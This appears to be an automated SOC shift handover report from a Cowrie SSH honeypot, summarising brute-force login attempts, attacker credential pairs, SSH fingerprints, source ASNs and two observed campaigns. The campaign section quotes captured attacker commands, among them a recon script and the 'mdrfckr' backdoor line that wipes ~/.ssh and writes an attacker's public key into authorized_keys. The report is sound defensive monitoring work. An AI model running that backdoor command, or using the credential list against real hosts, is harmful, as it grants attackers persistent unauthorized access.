# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-01 |
| **Generated At** | 2026-09-01T20:49:19Z |
| **Shift Time** | 20:49 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **240** |
| Confirmed Threats | **228** |
| False Positives Filtered | **12** (5.0%) |
| Unique Attacker IPs | **47** |
| Countries of Origin | **22** |
| High Severity Cases | **188** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **52** |
| Malware Samples Analyzed | **3** HIGH · **20** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **308** |
| Unique Credential Pairs | **266** |
| Unique Usernames | **65** |
| Unique Passwords | **179** |
| Successful Auth Pairs | **291** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 80 |
| `admin` | 37 |
| `oracle` | 22 |
| `test` | 16 |
| `git` | 13 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 20 |
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 12 |
| `password` | 11 |
| `123` | 9 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `support` | `support` | 6 |
| `admin` | `admin` | 5 |
| `root` | `3245gs5662d34` | 4 |
| `root` | `root` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Passw0rd` | `92.118.39.77` | 2026-09-01T14:55:59 |
| `root` | `letmein` | `92.118.39.77` | 2026-09-01T14:57:44 |
| `user` | `User@2022` | `217.60.255.130` | 2026-09-01T14:58:27 |
| `root` | `p4ssword` | `92.118.39.77` | 2026-09-01T14:59:32 |
| `root` | `Dd@12345` | `217.60.255.130` | 2026-09-01T15:00:12 |
| `root` | `p@ssw0rd` | `92.118.39.77` | 2026-09-01T15:01:25 |
| `root` | `passw0rd` | `92.118.39.77` | 2026-09-01T15:03:27 |
| `root` | `password` | `92.118.39.77` | 2026-09-01T15:05:21 |
| `root` | `qwerty` | `92.118.39.77` | 2026-09-01T15:07:09 |
| `fastuser` | `654321` | `217.60.255.130` | 2026-09-01T15:07:55 |
| `root` | `root1` | `92.118.39.77` | 2026-09-01T15:10:37 |
| `root` | `Active@123` | `217.60.255.130` | 2026-09-01T15:10:52 |
| `root` | `root12` | `92.118.39.77` | 2026-09-01T15:12:22 |
| `root` | `root123` | `92.118.39.77` | 2026-09-01T15:14:06 |
| `root` | `root2026` | `92.118.39.77` | 2026-09-01T15:15:53 |
| `user` | `!Q@W3e4r` | `217.60.255.130` | 2026-09-01T15:17:28 |
| `root` | `welcome` | `92.118.39.77` | 2026-09-01T15:17:38 |
| `admin` | `123456` | `92.118.39.77` | 2026-09-01T15:19:26 |
| `admin` | `123qwe` | `92.118.39.77` | 2026-09-01T15:21:23 |
| `root` | `Vps@123456` | `217.60.255.130` | 2026-09-01T15:21:45 |
| `admin` | `123qwerty` | `92.118.39.77` | 2026-09-01T15:23:27 |
| `admin` | `21` | `92.118.39.77` | 2026-09-01T15:25:31 |
| `admin` | `asd123!@#` | `217.60.255.130` | 2026-09-01T15:27:02 |
| `dhiraj` | `dhiraj@123` | `10.0.0.73` | 2026-09-01T15:27:03 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-01T15:27:08 |
| `dhiraj` | `3245gs5662d34` | `10.0.0.73` | 2026-09-01T15:27:09 |
| `admin` | `321` | `92.118.39.77` | 2026-09-01T15:27:24 |
| `admin` | `654321` | `92.118.39.77` | 2026-09-01T15:29:03 |
| `ftpuser` | `123321` | `10.0.0.73` | 2026-09-01T15:29:39 |
| `ftpuser` | `3245gs5662d34` | `10.0.0.73` | 2026-09-01T15:29:42 |
| `admin` | `P@ssw0rd` | `92.118.39.77` | 2026-09-01T15:30:43 |
| `root` | `Asdasd123` | `149.202.50.58` | 2026-09-01T15:31:50 |
| `345gs5662d34` | `345gs5662d34` | `149.202.50.58` | 2026-09-01T15:31:53 |
| `root` | `3245gs5662d34` | `149.202.50.58` | 2026-09-01T15:31:53 |
| `admin` | `Password` | `92.118.39.77` | 2026-09-01T15:32:25 |
| `root` | `Perfect@123` | `217.60.255.130` | 2026-09-01T15:32:35 |
| `admin` | `admin` | `92.118.39.77` | 2026-09-01T15:34:12 |
| `admin` | `admin12` | `92.118.39.77` | 2026-09-01T15:36:01 |
| `admin` | `9999` | `217.60.255.130` | 2026-09-01T15:36:43 |
| `huser` | `huser.123` | `207.180.233.98` | 2026-09-01T15:36:51 |
| `345gs5662d34` | `345gs5662d34` | `207.180.233.98` | 2026-09-01T15:36:54 |
| `huser` | `3245gs5662d34` | `207.180.233.98` | 2026-09-01T15:36:54 |
| `admin` | `admin123` | `92.118.39.77` | 2026-09-01T15:37:46 |
| `admin` | `admin2026` | `92.118.39.77` | 2026-09-01T15:39:33 |
| `admin` | `letmein` | `92.118.39.77` | 2026-09-01T15:41:20 |
| `admin` | `pa$w0rd` | `92.118.39.77` | 2026-09-01T15:43:00 |
| `root` | `Naser123` | `217.60.255.130` | 2026-09-01T15:43:11 |
| `admin` | `passw0rd` | `92.118.39.77` | 2026-09-01T15:44:42 |
| `admin` | `12345` | `217.60.255.130` | 2026-09-01T15:45:56 |
| `admin` | `password` | `92.118.39.77` | 2026-09-01T15:46:28 |
| `admin` | `qwerty` | `92.118.39.77` | 2026-09-01T15:48:21 |
| `administrator` | `123456` | `92.118.39.77` | 2026-09-01T15:50:17 |
| `clouduser` | `P@ssw0rd` | `10.0.0.73` | 2026-09-01T15:52:03 |
| `clouduser` | `3245gs5662d34` | `10.0.0.73` | 2026-09-01T15:52:09 |
| `root` | `﻿------fuck------` | `124.129.172.43` | 2026-09-01T15:52:11 |
| `administrator` | `P@ssw0rd` | `92.118.39.77` | 2026-09-01T15:52:16 |
| `root` | `'` | `217.60.255.130` | 2026-09-01T15:54:00 |
| `administrator` | `administrator` | `92.118.39.77` | 2026-09-01T15:54:25 |
| `admin` | `Admin@123` | `217.60.255.130` | 2026-09-01T15:55:37 |
| `administrator` | `administrator123` | `92.118.39.77` | 2026-09-01T15:56:16 |
| `root` | `Hik12345+` | `10.0.0.73` | 2026-09-01T15:57:22 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-01T15:57:28 |
| `administrator` | `passw0rd` | `92.118.39.77` | 2026-09-01T15:57:55 |
| `administrator` | `password` | `92.118.39.77` | 2026-09-01T15:59:38 |
| `ansible` | `123456` | `92.118.39.77` | 2026-09-01T16:01:31 |
| `ansible` | `ansible` | `92.118.39.77` | 2026-09-01T16:03:25 |
| `support` | `support` | `10.0.0.73` | 2026-09-01T16:04:10 |
| `root` | `test12345` | `217.60.255.130` | 2026-09-01T16:04:43 |
| `admin` | `1` | `217.60.255.130` | 2026-09-01T16:05:06 |
| `ansible` | `ansible123` | `92.118.39.77` | 2026-09-01T16:05:20 |
| `ansible` | `passw0rd` | `92.118.39.77` | 2026-09-01T16:07:19 |
| `ansible` | `password` | `92.118.39.77` | 2026-09-01T16:09:17 |
| `apache` | `P@ssw0rd` | `92.118.39.77` | 2026-09-01T16:11:16 |
| `apache` | `apache` | `92.118.39.77` | 2026-09-01T16:13:06 |
| `user` | `Admin@123` | `217.60.255.130` | 2026-09-01T16:14:26 |
| `apache` | `password` | `92.118.39.77` | 2026-09-01T16:14:42 |
| `root` | `Thanh@123` | `217.60.255.130` | 2026-09-01T16:15:15 |
| `backup` | `123qwe` | `92.118.39.77` | 2026-09-01T16:16:17 |
| `backup` | `54321` | `92.118.39.77` | 2026-09-01T16:17:54 |
| `backup` | `backup` | `92.118.39.77` | 2026-09-01T16:19:31 |
| `sandra` | `123` | `10.0.0.73` | 2026-09-01T16:19:34 |
| `sandra` | `3245gs5662d34` | `10.0.0.73` | 2026-09-01T16:19:36 |
| `admin` | `redhat` | `10.0.0.73` | 2026-09-01T16:19:50 |
| `admin` | `3245gs5662d34` | `10.0.0.73` | 2026-09-01T16:19:53 |
| `hossein` | `hossein123` | `217.60.255.130` | 2026-09-01T16:23:53 |
| `root` | `Media123` | `217.60.255.130` | 2026-09-01T16:26:01 |
| `root` | `1234QWERqwer` | `10.0.0.73` | 2026-09-01T16:26:47 |
| `ahmed` | `ahmed123` | `14.46.87.209` | 2026-09-01T16:30:16 |
| `345gs5662d34` | `345gs5662d34` | `14.46.87.209` | 2026-09-01T16:30:20 |
| `ahmed` | `3245gs5662d34` | `14.46.87.209` | 2026-09-01T16:30:21 |
| `username` | `a` | `202.152.148.30` | 2026-09-01T16:32:53 |
| `345gs5662d34` | `345gs5662d34` | `202.152.148.30` | 2026-09-01T16:32:58 |
| `username` | `3245gs5662d34` | `202.152.148.30` | 2026-09-01T16:32:59 |
| `hosein` | `hosein123` | `217.60.255.130` | 2026-09-01T16:33:29 |
| `root` | `BB@12` | `200.63.168.90` | 2026-09-01T16:33:52 |
| `345gs5662d34` | `345gs5662d34` | `200.63.168.90` | 2026-09-01T16:33:55 |
| `root` | `3245gs5662d34` | `200.63.168.90` | 2026-09-01T16:33:56 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-09-01T16:35:02 |
| `root` | `123@@@` | `64.110.90.250` | 2026-09-01T16:35:02 |
| `root` | `iptv@123` | `217.60.255.130` | 2026-09-01T16:36:29 |
| `root` | `centos` | `115.190.126.161` | 2026-09-01T16:39:49 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `2.26.172.97` | 2026-09-01T16:39:59 |
| `root` | `123@@@` | `144.22.238.238` | 2026-09-01T16:42:17 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-09-01T16:42:17 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-09-01T16:42:26 |
| `milad` | `milad123` | `217.60.255.130` | 2026-09-01T16:42:47 |
| `support` | `support` | `176.53.159.196` | 2026-09-01T16:44:42 |
| `root` | `Abcxyz@123` | `217.60.255.130` | 2026-09-01T16:47:23 |
| `debian` | `debian@1234` | `217.60.255.130` | 2026-09-01T16:52:23 |
| `root` | `Hoang@123` | `217.60.255.130` | 2026-09-01T16:58:06 |
| `admin` | `admin` | `10.0.0.73` | 2026-09-01T16:59:26 |
| `wsadmin` | `wsadmin` | `217.60.255.130` | 2026-09-01T17:01:51 |
| `eigenlayer` | `eigenlayer` | `159.223.123.239` | 2026-09-01T17:05:19 |
| `mina` | `mina` | `159.223.123.239` | 2026-09-01T17:07:45 |
| `root` | `Smoker123` | `217.60.255.130` | 2026-09-01T17:08:36 |
| `avalanche` | `avalanche` | `159.223.123.239` | 2026-09-01T17:10:12 |
| `dev` | `dev1234` | `217.60.255.130` | 2026-09-01T17:11:16 |
| `root` | `!QAZ2wsx` | `10.0.0.73` | 2026-09-01T17:17:51 |
| `root` | `root123` | `10.0.0.73` | 2026-09-01T17:18:04 |
| `root` | `password` | `10.0.0.73` | 2026-09-01T17:18:15 |
| `root` | `password123` | `10.0.0.73` | 2026-09-01T17:18:26 |
| `root` | `test` | `10.0.0.73` | 2026-09-01T17:18:45 |
| `root` | `test123` | `10.0.0.73` | 2026-09-01T17:18:55 |
| `root` | `123` | `10.0.0.73` | 2026-09-01T17:19:04 |
| `root` | `321` | `10.0.0.73` | 2026-09-01T17:19:13 |
| `root` | `1` | `10.0.0.73` | 2026-09-01T17:19:23 |
| `root` | `Optimus@123` | `217.60.255.130` | 2026-09-01T17:19:27 |
| `root` | `12` | `10.0.0.73` | 2026-09-01T17:19:33 |
| `root` | `1234` | `10.0.0.73` | 2026-09-01T17:19:42 |
| `root` | `12345` | `10.0.0.73` | 2026-09-01T17:19:52 |
| `root` | `12345678` | `10.0.0.73` | 2026-09-01T17:20:02 |
| `root` | `123456789` | `10.0.0.73` | 2026-09-01T17:20:11 |
| `root` | `1qaz2wsx` | `10.0.0.73` | 2026-09-01T17:20:21 |
| `root` | `1qaz@WSX` | `10.0.0.73` | 2026-09-01T17:20:30 |
| `root` | `qwerty` | `10.0.0.73` | 2026-09-01T17:20:39 |
| `Ahmad` | `Ahmad@123` | `217.60.255.130` | 2026-09-01T17:20:47 |
| `root` | `admin` | `10.0.0.73` | 2026-09-01T17:20:48 |
| `root` | `root1234` | `10.0.0.73` | 2026-09-01T17:20:57 |
| `root` | `root12345` | `10.0.0.73` | 2026-09-01T17:21:06 |
| `root` | `root12356` | `10.0.0.73` | 2026-09-01T17:21:15 |
| `redhat` | `redhat` | `10.0.0.73` | 2026-09-01T17:21:24 |
| `redhat` | `redhat123` | `10.0.0.73` | 2026-09-01T17:21:33 |
| `admin` | `1234` | `138.68.63.15` | 2026-09-01T17:21:39 |
| `redhat` | `123456` | `10.0.0.73` | 2026-09-01T17:21:42 |
| `redhat` | `1234567` | `10.0.0.73` | 2026-09-01T17:21:51 |
| `redhat` | `12345678` | `10.0.0.73` | 2026-09-01T17:22:00 |
| `admin` | `123456` | `138.68.63.15` | 2026-09-01T17:22:03 |
| `redhat` | `Admin123` | `10.0.0.73` | 2026-09-01T17:22:10 |
| `redhat` | `Admin1234` | `10.0.0.73` | 2026-09-01T17:22:21 |
| `admin` | `admin` | `138.68.63.15` | 2026-09-01T17:22:26 |
| `redhat` | `1qaz@WSX` | `10.0.0.73` | 2026-09-01T17:22:33 |
| `redhat` | `1qaz2wsx` | `10.0.0.73` | 2026-09-01T17:22:45 |
| `admin` | `admin123` | `138.68.63.15` | 2026-09-01T17:22:48 |
| `test` | `test` | `10.0.0.73` | 2026-09-01T17:22:57 |
| `admin` | `password` | `138.68.63.15` | 2026-09-01T17:23:08 |
| `test` | `test123` | `10.0.0.73` | 2026-09-01T17:23:09 |
| `test` | `password` | `10.0.0.73` | 2026-09-01T17:23:21 |
| `apache` | `apache` | `138.68.63.15` | 2026-09-01T17:23:29 |
| `test` | `123456` | `10.0.0.73` | 2026-09-01T17:23:33 |
| `test` | `123` | `10.0.0.73` | 2026-09-01T17:23:45 |
| `apache` | `apache123` | `138.68.63.15` | 2026-09-01T17:23:49 |
| `test` | `321` | `10.0.0.73` | 2026-09-01T17:23:57 |
| `test` | `1qaz2wsx` | `10.0.0.73` | 2026-09-01T17:24:09 |
| `app` | `123456` | `138.68.63.15` | 2026-09-01T17:24:10 |
| `test` | `1qaz@WSX` | `10.0.0.73` | 2026-09-01T17:24:21 |
| `app` | `app123456` | `138.68.63.15` | 2026-09-01T17:24:31 |
| `test` | `111111` | `10.0.0.73` | 2026-09-01T17:24:32 |
| `test` | `1234qwer` | `10.0.0.73` | 2026-09-01T17:24:44 |
| `appuser` | `appuser` | `138.68.63.15` | 2026-09-01T17:24:51 |
| `test` | `12345qwert` | `10.0.0.73` | 2026-09-01T17:24:56 |
| `test` | `testtest` | `10.0.0.73` | 2026-09-01T17:25:08 |
| `bigdata` | `bigdata` | `138.68.63.15` | 2026-09-01T17:25:11 |
| `test` | `test1` | `10.0.0.73` | 2026-09-01T17:25:20 |
| `bot` | `bot` | `138.68.63.15` | 2026-09-01T17:25:31 |
| `test` | `test11` | `10.0.0.73` | 2026-09-01T17:25:32 |
| `test` | `tester` | `10.0.0.73` | 2026-09-01T17:25:44 |
| `centos` | `123456` | `138.68.63.15` | 2026-09-01T17:25:51 |
| `test` | `tests` | `10.0.0.73` | 2026-09-01T17:25:55 |
| `testtest` | `testtest` | `10.0.0.73` | 2026-09-01T17:26:07 |
| `centos` | `centos` | `138.68.63.15` | 2026-09-01T17:26:11 |
| `teste` | `teste` | `10.0.0.73` | 2026-09-01T17:26:19 |
| `data` | `data` | `138.68.63.15` | 2026-09-01T17:26:30 |
| `oracle` | `oracle` | `10.0.0.73` | 2026-09-01T17:26:31 |
| `oracle` | `password` | `10.0.0.73` | 2026-09-01T17:26:43 |
| `demo` | `demo` | `138.68.63.15` | 2026-09-01T17:26:50 |
| `oracle` | `123456` | `10.0.0.73` | 2026-09-01T17:26:55 |
| `oracle` | `test` | `10.0.0.73` | 2026-09-01T17:27:07 |
| `deploy` | `deploy` | `138.68.63.15` | 2026-09-01T17:27:11 |
| `oracle` | `123` | `10.0.0.73` | 2026-09-01T17:27:19 |
| `dev` | `dev123456` | `138.68.63.15` | 2026-09-01T17:27:31 |
| `oracle` | `321` | `10.0.0.73` | 2026-09-01T17:27:32 |
| `oracle` | `oracle123` | `10.0.0.73` | 2026-09-01T17:27:44 |
| `docker` | `docker` | `138.68.63.15` | 2026-09-01T17:27:51 |
| `oracle` | `111111` | `10.0.0.73` | 2026-09-01T17:27:56 |
| `docker` | `docker123` | `138.68.63.15` | 2026-09-01T17:28:12 |
| `oracle` | `1qaz2wsx` | `10.0.0.73` | 2026-09-01T17:28:17 |
| `elastic` | `123456` | `138.68.63.15` | 2026-09-01T17:28:33 |
| `elastic` | `elastic` | `138.68.63.15` | 2026-09-01T17:28:54 |
| `oracle` | `1qaz@WSX` | `10.0.0.73` | 2026-09-01T17:28:56 |
| `elastic` | `elastic123` | `138.68.63.15` | 2026-09-01T17:29:15 |
| `oracle` | `1234qwer` | `10.0.0.73` | 2026-09-01T17:29:35 |
| `elasticsearch` | `123456` | `138.68.63.15` | 2026-09-01T17:29:36 |
| `elsearch` | `` | `138.68.63.15` | 2026-09-01T17:29:56 |
| `elsearch` | `elsearch` | `138.68.63.15` | 2026-09-01T17:30:12 |
| `root` | `admin@2023` | `217.60.255.130` | 2026-09-01T17:30:13 |
| `oracle` | `12345qwert` | `10.0.0.73` | 2026-09-01T17:30:15 |
| `anonymous` | `anonymous@123` | `217.60.255.130` | 2026-09-01T17:30:20 |
| `es` | `123` | `138.68.63.15` | 2026-09-01T17:30:33 |
| `es` | `123456` | `138.68.63.15` | 2026-09-01T17:30:54 |
| `oracle1` | `oracle1` | `10.0.0.73` | 2026-09-01T17:30:54 |
| `es` | `es123456` | `138.68.63.15` | 2026-09-01T17:31:15 |
| `oracle` | `admin` | `10.0.0.73` | 2026-09-01T17:31:34 |
| `es` | `es` | `138.68.63.15` | 2026-09-01T17:31:36 |
| `esroot` | `esroot` | `138.68.63.15` | 2026-09-01T17:31:57 |
| `oracle` | `root` | `10.0.0.73` | 2026-09-01T17:32:13 |
| `esuser` | `123` | `138.68.63.15` | 2026-09-01T17:32:18 |
| `esuser` | `123456` | `138.68.63.15` | 2026-09-01T17:32:40 |
| `oracle` | `qwerty` | `10.0.0.73` | 2026-09-01T17:32:52 |
| `esuser` | `esuser` | `138.68.63.15` | 2026-09-01T17:33:02 |
| `esuser` | `esuser123` | `138.68.63.15` | 2026-09-01T17:33:24 |
| `oracle` | `qwerty13456` | `10.0.0.73` | 2026-09-01T17:33:31 |
| `flask` | `12345678` | `138.68.63.15` | 2026-09-01T17:33:45 |
| `flask` | `flask123` | `138.68.63.15` | 2026-09-01T17:34:08 |
| `oracle` | `11111` | `10.0.0.73` | 2026-09-01T17:34:11 |
| `flink` | `flink` | `138.68.63.15` | 2026-09-01T17:34:29 |
| `oracle` | `q1w2e3` | `10.0.0.73` | 2026-09-01T17:34:50 |
| `flink` | `flink123` | `138.68.63.15` | 2026-09-01T17:34:52 |
| `ftp` | `123456` | `138.68.63.15` | 2026-09-01T17:35:14 |
| `oracle` | `q1w2e3r4` | `10.0.0.73` | 2026-09-01T17:35:30 |
| `ftp` | `ftp123` | `138.68.63.15` | 2026-09-01T17:35:36 |
| `ftpuser` | `abc123` | `138.68.63.15` | 2026-09-01T17:35:59 |
| `root` | `Dg123456` | `120.48.39.220` | 2026-09-01T17:36:07 |
| `oracle` | `q1w2e3r4t5` | `10.0.0.73` | 2026-09-01T17:36:10 |
| `ftpuser` | `ftpuser` | `138.68.63.15` | 2026-09-01T17:36:21 |
| `ftpuser` | `ftpuser123` | `138.68.63.15` | 2026-09-01T17:36:44 |
| `oracle` | `oracle!@#$%^` | `10.0.0.73` | 2026-09-01T17:36:50 |
| `git` | `123` | `138.68.63.15` | 2026-09-01T17:37:06 |
| `git` | `123456` | `138.68.63.15` | 2026-09-01T17:37:28 |
| `oracle` | `oracle!@#` | `10.0.0.73` | 2026-09-01T17:37:30 |
| `git` | `git` | `138.68.63.15` | 2026-09-01T17:37:50 |
| `info` | `info` | `10.0.0.73` | 2026-09-01T17:38:09 |
| `git` | `git123` | `138.68.63.15` | 2026-09-01T17:38:11 |
| `gitlab` | `123456` | `138.68.63.15` | 2026-09-01T17:38:33 |
| `info` | `1qaz@WSX` | `10.0.0.73` | 2026-09-01T17:38:49 |
| `gitlab` | `12345678` | `138.68.63.15` | 2026-09-01T17:38:54 |
| `gitlab` | `gitlab123` | `138.68.63.15` | 2026-09-01T17:39:16 |
| `info` | `info123` | `10.0.0.73` | 2026-09-01T17:39:30 |
| `Anonymous` | `Anonymous@123` | `217.60.255.130` | 2026-09-01T17:39:37 |
| `gitlab` | `gitlab` | `138.68.63.15` | 2026-09-01T17:39:38 |
| `info` | `123456` | `10.0.0.73` | 2026-09-01T17:40:10 |
| `root` | `Vv@1234` | `217.60.255.130` | 2026-09-01T17:40:44 |
| `kafka` | `kafka` | `10.0.0.73` | 2026-09-01T17:40:50 |
| `kafka` | `password` | `10.0.0.73` | 2026-09-01T17:41:31 |
| `kafka` | `123456` | `10.0.0.73` | 2026-09-01T17:42:11 |
| `kafka` | `test` | `10.0.0.73` | 2026-09-01T17:42:52 |
| `kafka` | `123` | `10.0.0.73` | 2026-09-01T17:43:32 |
| `kafka` | `321` | `10.0.0.73` | 2026-09-01T17:44:13 |
| `git` | `git` | `10.0.0.73` | 2026-09-01T17:44:53 |
| `git` | `password` | `10.0.0.73` | 2026-09-01T17:45:34 |
| `git` | `123456` | `10.0.0.73` | 2026-09-01T17:46:14 |
| `git` | `test` | `10.0.0.73` | 2026-09-01T17:46:55 |
| `admin` | `admin` | `27.79.5.21` | 2026-09-01T17:46:59 |
| `git` | `123` | `10.0.0.73` | 2026-09-01T17:47:35 |
| `git` | `321` | `10.0.0.73` | 2026-09-01T17:48:17 |
| `git` | `git123` | `10.0.0.73` | 2026-09-01T17:48:58 |
| `webadmin` | `P@ssw0rd` | `217.60.255.130` | 2026-09-01T17:49:20 |
| `git` | `111111` | `10.0.0.73` | 2026-09-01T17:49:39 |
| `git` | `1qaz2wsx` | `10.0.0.73` | 2026-09-01T17:50:20 |
| `root` | `﻿------fuck------` | `182.96.95.66` | 2026-09-01T17:51:17 |
| `root` | `Afra@123` | `217.60.255.130` | 2026-09-01T17:51:36 |
| `root` | `admin` | `27.79.5.21` | 2026-09-01T17:51:42 |
| `installer` | `installer` | `27.79.5.21` | 2026-09-01T17:56:52 |
| `admin` | `Welcome@123` | `217.60.255.130` | 2026-09-01T17:58:54 |
| `user` | `user` | `27.79.5.21` | 2026-09-01T17:59:02 |
| `root` | `Long@123` | `217.60.255.130` | 2026-09-01T18:02:29 |
| `ubnt` | `ubnt` | `27.79.5.21` | 2026-09-01T18:03:59 |
| `squid` | `squid` | `27.79.5.21` | 2026-09-01T18:06:53 |
| `admin` | `zxcv@1234` | `217.60.255.130` | 2026-09-01T18:08:39 |
| `config` | `config` | `27.79.5.21` | 2026-09-01T18:11:33 |
| `root` | `Vietnam@123` | `217.60.255.130` | 2026-09-01T18:13:41 |
| `support` | `support` | `27.79.5.21` | 2026-09-01T18:15:18 |
| `admin` | `Aa@123` | `217.60.255.130` | 2026-09-01T18:18:39 |
| `root` | `@` | `27.79.5.21` | 2026-09-01T18:18:51 |
| `root` | `User@123` | `217.60.255.130` | 2026-09-01T18:25:03 |
| `admin` | `admin@123` | `27.79.5.21` | 2026-09-01T18:26:29 |
| `admin` | `Aa@1234` | `217.60.255.130` | 2026-09-01T18:29:03 |
| `system` | `OkwKcECs8qJP2Z` | `27.79.5.21` | 2026-09-01T18:34:00 |
| `root` | `Nothing@123` | `217.60.255.130` | 2026-09-01T18:36:14 |
| `Mahmoud` | `Mahmoud12345` | `217.60.255.130` | 2026-09-01T18:39:03 |
| `root` | `Asdf!234` | `217.60.255.130` | 2026-09-01T18:47:15 |
| `root` | `123456123456` | `217.60.255.130` | 2026-09-01T18:48:42 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **240** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 110 |
| libssh | 76 |
| AsyncSSH (Python) | 12 |
| Paramiko (Python) | 6 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 55 | 2 |
| `2ec37a7cc8da...` | Mirai/variant | 47 | 1 |
| `419da4c91ddb...` | Modern SSH client | 47 | 1 |
| `f555226df196...` | Mirai/variant | 17 | 7 |
| `fda360b1b4f4...` | Mirai/variant | 12 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 55 | 2 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 47 | 1 | Mirai/variant |
| `419da4c91ddb...` | libssh | 47 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 17 | 7 | Mirai/variant |
| `95420f9d932d...` | libssh | 12 | 4 | — |
| `fda360b1b4f4...` | AsyncSSH (Python) | 12 | 1 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 46 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.77`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.48.39.220`, `207.180.233.98`, `200.63.168.90`, `202.152.148.30`, `14.46.87.209`, `149.202.50.58`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **47** |
| Unique ASNs | **30** |
| High-Risk ASNs | **24** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 11 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS7552` | Viettel Group | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS211298` | Driftnet Ltd | 2 | HIGH |
| `AS393406` | DigitalOcean, LLC | 2 | LOW |
| `AS8075` | Microsoft Corporation | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (187)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1c1ccceef67b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 14:55 |
| **Last Seen** | 2026-09-01 14:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
